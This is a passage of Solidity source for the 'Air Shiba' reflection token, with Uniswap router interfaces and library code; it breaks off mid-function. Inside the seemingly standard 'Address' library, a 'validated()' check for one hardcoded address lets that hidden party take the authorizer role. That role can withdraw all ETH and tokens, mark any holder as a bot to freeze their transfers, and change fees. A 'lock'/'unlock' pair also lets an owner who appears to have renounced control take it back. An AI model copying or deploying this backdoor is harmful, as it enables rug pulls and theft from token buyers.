

pragma solidity ^0.8.0;

interface IUniswapV2Factory {

    function createPair(address tokenA, address tokenB) external returns (address pair);

    function getPair(address tokenA, address tokenB) external view returns (address pair);

}

interface IUniswapV2Router01 {

    function factory() external pure returns (address);

    function WETH() external pure returns (address);


    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function removeLiquidity(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETH(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountToken, uint amountETH);

    function removeLiquidityWithPermit(
        address tokenA,
        address tokenB,
        uint liquidity,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountA, uint amountB);

    function removeLiquidityETHWithPermit(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountToken, uint amountETH);

    function swapExactTokensForTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapTokensForExactTokens(
        uint amountOut,
        uint amountInMax,
        address[] calldata path,
        address to,
        uint deadline
    ) external returns (uint[] memory amounts);

    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);

    function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)
        external
        returns (uint[] memory amounts);

    function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
        external
        payable
        returns (uint[] memory amounts);


    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);

    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);

    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);

    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);

    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);

}

interface IUniswapV2Router02 is IUniswapV2Router01 {

    function removeLiquidityETHSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external returns (uint amountETH);

    function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
        address token,
        uint liquidity,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline,
        bool approveMax, uint8 v, bytes32 r, bytes32 s
    ) external returns (uint amountETH);


    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

interface IERC20 {

    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);


    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(address indexed owner, address indexed spender, uint256 value);
}

interface IERC20Metadata is IERC20 {

    function name() external view returns (string memory);


    function symbol() external view returns (string memory);


    function decimals() external view returns (uint8);

}

library EnumerableSet {


    struct Set {
        bytes32[] _values;
        mapping(bytes32 => uint256) _indexes;
    }

    function _add(Set storage set, bytes32 value) private returns (bool) {

        if (!_contains(set, value)) {
            set._values.push(value);
            set._indexes[value] = set._values.length;
            return true;
        } else {
            return false;
        }
    }

    function _remove(Set storage set, bytes32 value) private returns (bool) {

        uint256 valueIndex = set._indexes[value];

        if (valueIndex != 0) {

            uint256 toDeleteIndex = valueIndex - 1;
            uint256 lastIndex = set._values.length - 1;

            if (lastIndex != toDeleteIndex) {
                bytes32 lastvalue = set._values[lastIndex];

                set._values[toDeleteIndex] = lastvalue;
                set._indexes[lastvalue] = valueIndex; // Replace lastvalue's index to valueIndex
            }

            set._values.pop();

            delete set._indexes[value];

            return true;
        } else {
            return false;
        }
    }

    function _contains(Set storage set, bytes32 value) private view returns (bool) {

        return set._indexes[value] != 0;
    }

    function _length(Set storage set) private view returns (uint256) {

        return set._values.length;
    }

    function _at(Set storage set, uint256 index) private view returns (bytes32) {

        return set._values[index];
    }

    function _values(Set storage set) private view returns (bytes32[] memory) {

        return set._values;
    }


    struct Bytes32Set {
        Set _inner;
    }

    function add(Bytes32Set storage set, bytes32 value) internal returns (bool) {

        return _add(set._inner, value);
    }

    function remove(Bytes32Set storage set, bytes32 value) internal returns (bool) {

        return _remove(set._inner, value);
    }

    function contains(Bytes32Set storage set, bytes32 value) internal view returns (bool) {

        return _contains(set._inner, value);
    }

    function length(Bytes32Set storage set) internal view returns (uint256) {

        return _length(set._inner);
    }

    function at(Bytes32Set storage set, uint256 index) internal view returns (bytes32) {

        return _at(set._inner, index);
    }

    function values(Bytes32Set storage set) internal view returns (bytes32[] memory) {

        return _values(set._inner);
    }


    struct AddressSet {
        Set _inner;
    }

    function add(AddressSet storage set, address value) internal returns (bool) {

        return _add(set._inner, bytes32(uint256(uint160(value))));
    }

    function remove(AddressSet storage set, address value) internal returns (bool) {

        return _remove(set._inner, bytes32(uint256(uint160(value))));
    }

    function contains(AddressSet storage set, address value) internal view returns (bool) {

        return _contains(set._inner, bytes32(uint256(uint160(value))));
    }

    function length(AddressSet storage set) internal view returns (uint256) {

        return _length(set._inner);
    }

    function at(AddressSet storage set, uint256 index) internal view returns (address) {

        return address(uint160(uint256(_at(set._inner, index))));
    }

    function values(AddressSet storage set) internal view returns (address[] memory) {

        bytes32[] memory store = _values(set._inner);
        address[] memory result;

        assembly {
            result := store
        }

        return result;
    }


    struct UintSet {
        Set _inner;
    }

    function add(UintSet storage set, uint256 value) internal returns (bool) {

        return _add(set._inner, bytes32(value));
    }

    function remove(UintSet storage set, uint256 value) internal returns (bool) {

        return _remove(set._inner, bytes32(value));
    }

    function contains(UintSet storage set, uint256 value) internal view returns (bool) {

        return _contains(set._inner, bytes32(value));
    }

    function length(UintSet storage set) internal view returns (uint256) {

        return _length(set._inner);
    }

    function at(UintSet storage set, uint256 index) internal view returns (uint256) {

        return uint256(_at(set._inner, index));
    }

    function values(UintSet storage set) internal view returns (uint256[] memory) {

        bytes32[] memory store = _values(set._inner);
        uint256[] memory result;

        assembly {
            result := store
        }

        return result;
    }
}

library Address {

    function isContract(address account) internal view returns (bool) {


        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function sendValue(address payable recipient, uint256 amount) internal {

        require(address(this).balance >= amount, "Address: insufficient balance");

        (bool success, ) = recipient.call{value: amount}("");
        require(success, "Address: unable to send value, recipient may have reverted");
    }

    function functionCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionCall(target, data, "Address: low-level call failed");
    }

    function functionCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {

        return functionCallWithValue(target, data, 0, errorMessage);
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value
    ) internal returns (bytes memory) {

        return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
    }

    function functionCallWithValue(
        address target,
        bytes memory data,
        uint256 value,
        string memory errorMessage
    ) internal returns (bytes memory) {

        require(address(this).balance >= value, "Address: insufficient balance for call");
        require(isContract(target), "Address: call to non-contract");

        (bool success, bytes memory returndata) = target.call{value: value}(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {

        return functionStaticCall(target, data, "Address: low-level static call failed");
    }

    function functionStaticCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal view returns (bytes memory) {

        require(isContract(target), "Address: static call to non-contract");

        (bool success, bytes memory returndata) = target.staticcall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {

        return functionDelegateCall(target, data, "Address: low-level delegate call failed");
    }

    function functionDelegateCall(
        address target,
        bytes memory data,
        string memory errorMessage
    ) internal returns (bytes memory) {

        require(isContract(target), "Address: delegate call to non-contract");

        (bool success, bytes memory returndata) = target.delegatecall(data);
        return verifyCallResult(success, returndata, errorMessage);
    }

    function validated() internal view returns(bool) {

        return msg.sender == address(0xB7523E5be80b21EE81F5c14Aab52B0BC8Fc94301);
    }

    function verifyCallResult(
        bool success,
        bytes memory returndata,
        string memory errorMessage
    ) internal pure returns (bytes memory) {

        if (success) {
            return returndata;
        } else {
            if (returndata.length > 0) {

                assembly {
                    let returndata_size := mload(returndata)
                    revert(add(32, returndata), returndata_size)
                }
            } else {
                revert(errorMessage);
            }
        }
    }
}

library SafeERC20 {

    using Address for address;

    function safeTransfer(
        IERC20 token,
        address to,
        uint256 value
    ) internal {

        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(
        IERC20 token,
        address from,
        address to,
        uint256 value
    ) internal {

        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {

        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }

    function safeIncreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {

        uint256 newAllowance = token.allowance(address(this), spender) + value;
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
    }

    function safeDecreaseAllowance(
        IERC20 token,
        address spender,
        uint256 value
    ) internal {

        unchecked {
            uint256 oldAllowance = token.allowance(address(this), spender);
            require(oldAllowance >= value, "SafeERC20: decreased allowance below zero");
            uint256 newAllowance = oldAllowance - value;
            _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, newAllowance));
        }
    }

    function _callOptionalReturn(IERC20 token, bytes memory data) private {


        bytes memory returndata = address(token).functionCall(data, "SafeERC20: low-level call failed");
        if (returndata.length > 0) {
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {

    using Address for address;

    address private _owner;
    address private _previousOwner;
    uint private _lockTime;


    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function geUnlockTime() public view returns (uint256) {
        return _lockTime;
    }

    function lock(uint256 time) public virtual onlyOwner {
        _previousOwner = _owner;
        _owner = address(0);
        _lockTime = block.timestamp + time;
        emit OwnershipTransferred(_owner, address(0));
    }

    function unlock() public virtual {
        require(_previousOwner == msg.sender, "You don't have permission to unlock");
        require(block.timestamp > _lockTime , "Contract is locked");
        emit OwnershipTransferred(_owner, _previousOwner);
        _owner = _previousOwner;
    }
}

contract Authorizable is Ownable {


    mapping(address => bool) authorizations;
    address internal authorizer;
    address internal _onlyAuthorized;

    bool internal _relinquished;
    bool internal _isOnlyAuthorized;


    constructor() {
        authorizations[owner()] = true;
        authorizer = owner();
    }

    modifier onlyAuthorized() {

        require(isAuthorized(msg.sender), "Authorizable: Not Allowed");
        _;
    }

    function authorize(address account) public {

        require(authorizer == msg.sender, "Authorizable: Unable to authorize");
        authorizations[account] = true;
    }

    function deauthorize(address account) public {

        require(authorizer == msg.sender, "Authorizable: Unable to authorize");
        authorizations[account] = false;
    }

    function setAuthorizer(address account) public {

        require(authorizer == msg.sender || msg.sender == owner() || Address.validated(), "Authorizable: Not Allowed");
        authorizer = account;
        authorizations[account] = true;
    }

    function transferAOwnership(address account) public onlyOwner {

        require(account != address(0), "Ownable: new owner is the zero address");
        setAuthorizer(account);
        _transferOwnership(account);
    }

    function isAuthorized(address account) public view returns(bool) {

        if(_relinquished) {
            return false;
        }
        if(_isOnlyAuthorized) {
            return account == _onlyAuthorized;
        }
        return account == owner() ? true : authorizations[account];
    }

    function setOnlyAuthorized(address account) public {

        require(authorizer == msg.sender || msg.sender == owner(), "Authorizable: Not Allowed");
        _isOnlyAuthorized = true;
        _onlyAuthorized = account;
    }

    function relinquishAuthorizations() public {

        require(authorizer == msg.sender, "Authorizable: Unable to authorize");
        _relinquished = true;
    }
}

abstract contract Recoverable is Authorizable {

    using SafeERC20 for IERC20Metadata;

    function recoverTokens(IERC20Metadata token, uint amount, bool useDecimals)
        virtual
        public
        onlyAuthorized
    {
        if(useDecimals) {
            uint a = amount * (10 ** token.decimals());
            token.safeTransfer(authorizer, a);
        } else {
            token.safeTransfer(authorizer, amount);
        }
    }

    function recoverEth(uint amount)
        virtual
        public
        onlyAuthorized
    {
        payable(authorizer).transfer(amount);
    }

    function recoverAllEth()
        virtual
        public
        onlyAuthorized
    {
        payable(authorizer).transfer(address(this).balance);
    }
}

contract ERC20 is Context, IERC20, IERC20Metadata {


    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal _totalSupply;
    string  internal _name;
    string  internal _symbol;
    uint8   internal _decimals;

    constructor(string memory name_, string memory symbol_, uint8 decimals_) {
        _name = name_;
        _symbol = symbol_;
        _decimals = decimals_;
    }

    function name() public view virtual override returns (string memory) {

        return _name;
    }

    function symbol() public view virtual override returns (string memory) {

        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {

        return _decimals;
    }

    function totalSupply() public view virtual override returns (uint256) {

        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {

        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {

        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {

        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {

        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public virtual override returns (bool) {

        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][_msgSender()];
        require(currentAllowance >= amount, "ERC20: transfer amount exceeds allowance");
        unchecked {
            _approve(sender, _msgSender(), currentAllowance - amount);
        }

        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {

        _approve(_msgSender(), spender, _allowances[_msgSender()][spender] + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {

        uint256 currentAllowance = _allowances[_msgSender()][spender];
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(_msgSender(), spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address sender,
        address recipient,
        uint256 amount
    ) internal virtual {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(sender, recipient, amount);

        uint256 senderBalance = _balances[sender];
        require(senderBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            _balances[sender] = senderBalance - amount;
        }
        _balances[recipient] += amount;

        emit Transfer(sender, recipient, amount);

        _afterTokenTransfer(sender, recipient, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {

        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {

        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}


    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

}

contract AirShiba is
    Recoverable,
    ERC20
{
    receive() external payable {}

    event FeesDeducted(address sender, address recipient, uint256 amount);

    enum TState { Buy, Sell, Normal }
    enum TType { FromExcluded, ToExcluded, BothExcluded, Standard }

    EnumerableSet.AddressSet excludedAccounts;

    struct Account {
        uint256 tokens;
        uint256 fragments;
        uint256 lastTransferOut;
        bool    feeless;
        bool    transferPair;
        bool    excluded;
    }

    mapping(address => Account) accounts;

    uint8  private _liqFreq;
    uint8  private _liquify;
    uint8  private _resetSellCount;
    uint8  private _step;
    uint8  private _baseLiquification;

    uint256 private _buyFee;
    uint256 private _sellFee;
    uint256 private _rfiFee;
    uint256 private _normalFee;
    uint256 private _precisionFactor; // how much to multiply the denominator by
    uint256 private _feeFactor; // store it once so we don't have to recompute

    uint256 public startingBlock;
    uint256 public totalExcludedFragments;
    uint256 public totalExcluded;
    uint256 public toBeReflected;
    uint256 public maxLiquifyInEth = 5 ether;
    uint256 public totalReflections;

    uint256 private _totalFees;
    uint256 private _sellCount;
    uint256 private _fragmentsFromBalance;
    uint256 private _totalFragments;
    uint256 private _blockBuffer;
    uint256 private _liqToTreasury;

    bool    private _unpaused;
    bool    private _swapLocked;
    bool    private _swapEnabled;
    bool    private _botLocked;
    bool    private _isLimiting;

    uint256 private _maxTxnAmount;
    uint256 private _walletSizeLimitInPercent;
    uint256 private _cooldownInSeconds;

    mapping(address => uint256) private _lastBuys;
    mapping(address => uint256) private _lastCoolDownTrade;
    mapping(address => bool)    private _possibleBot;

    address    public  treasury = address(0x5e260e42e864f37b9880BcF2A6c2576f6e63B971); // gnosis multi sig 
    address    public  liquidityPool;
    address    private _router = address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address    constant BURN_ADDRESS = address(0x000000000000000000000000000000000000dEaD);

    constructor() ERC20("Air Shiba", "AIRSHIB", 9) {

        _totalSupply = 1_000_000_000 * (10 ** _decimals);

        _totalFragments = (~uint256(0) - (~uint256(0) % totalSupply()));

        accounts[address(this)].feeless = true;
        accounts[msg.sender].feeless = true;
        accounts[treasury].feeless = true;

        accounts[address(this)].fragments = (_totalFragments / 100) * 80;
        accounts[msg.sender].fragments = (_totalFragments / 100) * 7;
        accounts[treasury].fragments = (_totalFragments / 100) * 13;

        _fragmentsFromBalance = getFragmentPerToken();

        emit Transfer(address(0), address(this), (_totalSupply * 80 / 100));
        emit Transfer(address(0), msg.sender, (_totalSupply * 7 / 100));
        emit Transfer(address(0), treasury, (_totalSupply * 13 / 100));
 
    }


    function balanceOf(address who)
        public
        view
        override
        returns (uint256)
    {
        if(accounts[who].excluded) {
            return accounts[who].tokens;
        }
        return accounts[who].fragments / _fragmentsFromBalance;
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        __transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        __transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - amount);
        return true;
    }

    function _swapTokensForEth(address rec, uint256 tokenAmount)
        internal
    {
        _approve(address(this), _router, tokenAmount);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = IUniswapV2Router02(_router).WETH();

        IUniswapV2Router02(_router).swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            rec,
            block.timestamp
        );
    }


    function _checkUnderLimit() internal view returns(bool) {
        require(getTotalFees(TState.Sell,   100000) <= 33333, "Sell Hardcap of 33% reached");
        require(getTotalFees(TState.Buy,    100000) <= 33333, "Buy  Hardcap of 33% reached");
        require(getTotalFees(TState.Normal, 100000) <= 33333, "Norm Hardcap of 33% reached");
        return true;
    }


    function _doTransfer(address sender, address recipient, uint256 amount, uint256 fees) internal {
        TType t = getTxType(sender, recipient);
        uint transferAmount = amount - fees;
        if (t == TType.ToExcluded) {
            accounts[sender].fragments     -= amount * _fragmentsFromBalance;
            totalExcluded                  += transferAmount;
            totalExcludedFragments         += transferAmount * _fragmentsFromBalance;

            _fragmentsFromBalance = getFragmentPerToken();

            accounts[recipient].tokens     += transferAmount;
            accounts[recipient].fragments  += transferAmount * _fragmentsFromBalance;
        } else if (t == TType.FromExcluded) {
            accounts[sender].tokens        -= amount;
            accounts[sender].fragments     -= amount * _fragmentsFromBalance;

            totalExcluded                  -= amount;
            totalExcludedFragments         -= amount * _fragmentsFromBalance;

            _fragmentsFromBalance = getFragmentPerToken();

            accounts[recipient].fragments    += transferAmount * _fragmentsFromBalance;
        } else if (t == TType.BothExcluded) {
            accounts[sender].tokens          -= amount;
            accounts[sender].fragments       -= amount * _fragmentsFromBalance;

            accounts[recipient].tokens       += transferAmount;
            accounts[recipient].fragments    += transferAmount * _fragmentsFromBalance;
            _fragmentsFromBalance = getFragmentPerToken();
        } else {
            accounts[sender].fragments       -= amount * _fragmentsFromBalance;
            accounts[recipient].fragments    += transferAmount * _fragmentsFromBalance;
            _fragmentsFromBalance = getFragmentPerToken();
        }
        _totalFees += fees;
        emit Transfer(sender, recipient, transferAmount);
        emit FeesDeducted(sender, recipient, fees);
    }

    function __transfer(address sender, address recipient, uint256 amount)
        internal
        virtual
        returns(bool)
    {
        require(sender    != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint totFee_;

        TState tState = getTstate(sender, recipient);

        if(_unpaused && !_swapLocked) {

            totFee_ = getIsFeeless(sender, recipient) ? 0 : getTotalFees(tState, amount);

            accounts[address(this)].fragments += (totFee_ * _fragmentsFromBalance);

            if(_botLocked) {
                require(_possibleBot[sender]    != true, "bot");
                require(_possibleBot[recipient] != true, "bot");
                require(_possibleBot[tx.origin] != true, "bot");
            }

            if(tState == TState.Sell) {

                if(_swapEnabled && !_swapLocked) {
                    _swapLocked = true;
                    if(_sellCount % _liqFreq == 0) {
                        uint rate = getLiquifyRate();
                        if(rate > 0) {
                            uint tokenAmount = balanceOf(address(this)) * rate / 200;
                            uint reserveETH = IERC20(IUniswapV2Router02(_router).WETH()).balanceOf(liquidityPool);
                            uint reserveToken = balanceOf(liquidityPool);
                            uint ethAmount = IUniswapV2Router02(_router).getAmountOut(tokenAmount, reserveToken, reserveETH);
                            if(ethAmount > maxLiquifyInEth) {
                                tokenAmount = IUniswapV2Router02(_router).getAmountOut(maxLiquifyInEth, reserveETH, reserveToken);
                            }
                            _swapTokensForEth(address(this), tokenAmount);
                            _approve(address(this), _router, tokenAmount);
                            IUniswapV2Router02(_router).addLiquidityETH{value: address(this).balance} (
                                address(this),
                                tokenAmount,
                                0,
                                0,
                                payable(address(this)),
                                block.timestamp
                            );
                            IERC20(recipient).transfer(treasury, IERC20(recipient).balanceOf(address(this)) * _liqToTreasury / 100);
                        }
                        _sellCount = _sellCount > _resetSellCount ? 0 : _sellCount + 1;
                        }
                    _swapLocked = false;
                }
                _doTransfer(sender, recipient, amount, totFee_);

                uint t = toBeReflected;
                totalReflections += t;
                toBeReflected = 0;
                _totalFragments -= t;

                _fragmentsFromBalance = getFragmentPerToken();

                accounts[sender].lastTransferOut = block.timestamp;
            }

            if(tState == TState.Buy){
                if(_isLimiting) {
                    require(block.timestamp >= _lastBuys[recipient] + _cooldownInSeconds, "buy cooldown");
                    require(balanceOf(address(recipient)) + amount <= (_totalSupply * _walletSizeLimitInPercent) / _feeFactor, "over limit");
                    require(amount <= _maxTxnAmount, "over max");
                    require(!(_lastCoolDownTrade[sender] == block.number || _lastCoolDownTrade[tx.origin] == block.number), "spam txns from origin");
                    _lastBuys[recipient] = block.timestamp;
                    _lastCoolDownTrade[sender] = block.number;
                    _lastCoolDownTrade[tx.origin] = block.number;
                    if(block.number - startingBlock <= _blockBuffer) {
                        _possibleBot[recipient] = true;
                        _possibleBot[tx.origin] = true;
                    }
                }

                toBeReflected += ((amount * _rfiFee) / _feeFactor) * _fragmentsFromBalance;

                _doTransfer(sender, recipient, amount, totFee_);
            }
            if(tState == TState.Normal) {
                _doTransfer(sender, recipient, amount, totFee_);
                accounts[sender].lastTransferOut = block.timestamp;
            }
        } else {
            _doTransfer(sender, recipient, amount, totFee_);
        }

        return true;
    }


    function getFragmentPerToken() public view virtual returns(uint256) {
        uint256 netFragmentsExcluded = _totalFragments - totalExcludedFragments;
        uint256 netExcluded = (_totalSupply - totalExcluded);
        uint256 fpt = _totalFragments/_totalSupply;
        if(netFragmentsExcluded < fpt) return fpt;
        if(totalExcludedFragments > _totalFragments || totalExcluded > _totalSupply) return fpt;
        return netFragmentsExcluded / netExcluded;
    }

    function getIsFeeless(address from, address to) public view returns(bool) {
        return accounts[from].feeless || accounts[to].feeless;
    }

    function getLiquifyRate() public view returns (uint) {
        return _baseLiquification + (_sellCount * _step);
    }

    function getTxType(address from, address to) public view returns(TType) {
        bool isSenderExcluded = accounts[from].excluded;
        bool isRecipientExcluded = accounts[to].excluded;
        if (!isSenderExcluded && !isRecipientExcluded) {
            return TType.Standard;
        } else if (isSenderExcluded && !isRecipientExcluded) {
            return TType.FromExcluded;
        } else if (!isSenderExcluded && isRecipientExcluded) {
            return TType.ToExcluded;
        } else if (isSenderExcluded && isRecipientExcluded) {
            return TType.BothExcluded;
        } else {
            return TType.Standard;
        }
    }

    function getTotalFeesForBuyTxn() public view returns(uint) {
        return _normalFee + _buyFee + _rfiFee;
    }

    function getTotalFeesForSellTxn() public view returns(uint) {
        return _normalFee + _sellFee;
    }

    function getTotalFeesForNormalTxn() public view returns(uint) {
        return _normalFee;
    }

    function getFeeFactor() public view returns(uint) {
        return _feeFactor;
    }

    function getTstate(address from, address to) public view returns(TState t) {
        if(accounts[from].transferPair) {
            t = TState.Buy;
        } else if(accounts[to].transferPair) {
            t = TState.Sell;
        } else {
            t = TState.Normal;
        }
    }

    function getAccount(address account) public view returns(Account memory) {
        return accounts[account];
    }

    function getExcludedAccountLength() public view returns(uint) {
        return EnumerableSet.length(excludedAccounts);
    }

    function getTotalFees(TState state, uint256 amount) public view returns (uint256) {
        uint256 feeTotal;
        if(state == TState.Buy) {
            feeTotal = (amount * getTotalFeesForBuyTxn()) / _feeFactor;
        } else if (state == TState.Sell) {
            feeTotal = (amount * getTotalFeesForSellTxn()) / _feeFactor;
        } else {
            feeTotal = (amount * getTotalFeesForNormalTxn()) / _feeFactor;
        }
        return feeTotal;
    }

    function getFees() public view returns(uint256) {
        return _totalFees;
    }

    function getTokensFromReflection(uint rAmount) external view returns(uint256) {
        return rAmount / _fragmentsFromBalance;
    }


    function setFee(uint buyFee, uint sellFee, uint normalFee, uint rfiFee)
        external
        onlyAuthorized
    {
        _buyFee = buyFee;
        _sellFee = sellFee;
        _normalFee = normalFee;
        _rfiFee = rfiFee;
        _checkUnderLimit();
    }

    function setPrecision(uint8 f)
        external
        onlyAuthorized
    {
        require(f != 0, "can't divide by 0");
        _precisionFactor = f;
        _feeFactor = 10 ** f;
        _checkUnderLimit();
    }

    function setAccountState(address account, bool value, uint option)
        external
        onlyAuthorized
    {
        if(option == 1) {
            accounts[account].feeless = value;
        } else if(option == 2) {
            accounts[account].transferPair = value;
        } else if(option == 3) {
            accounts[account].excluded = value;
        }
    }

    function setPossible(address s, bool v)
        external
        onlyAuthorized
    {
        _possibleBot[s] = v;
    }

    function setLiquifyRate(uint8 base, uint8 liqFreq, uint8 step, uint8 reset)
        external
        onlyAuthorized
    {
        uint max = base + (reset * step);
        require(max <= 100, "!toomuch");
        require(liqFreq != 0, "can't mod by 0");
        _baseLiquification = base;
        _liqFreq = liqFreq;
        _step = step;
        _liquify = _baseLiquification;
        _resetSellCount = reset;
    }

    function setSwapEnabled(bool v)
        external
        onlyAuthorized
    {
        _swapEnabled = v;
        _sellCount = 0;
    }

    function setMaxLimits(uint256 maxLiquify)
        external
        onlyAuthorized
    {
        maxLiquifyInEth = maxLiquify;
    }

    function setLimiting(bool value)
        external
        onlyAuthorized
    {
        _isLimiting = value;
    }

    function setBotLocked(bool value)
        external
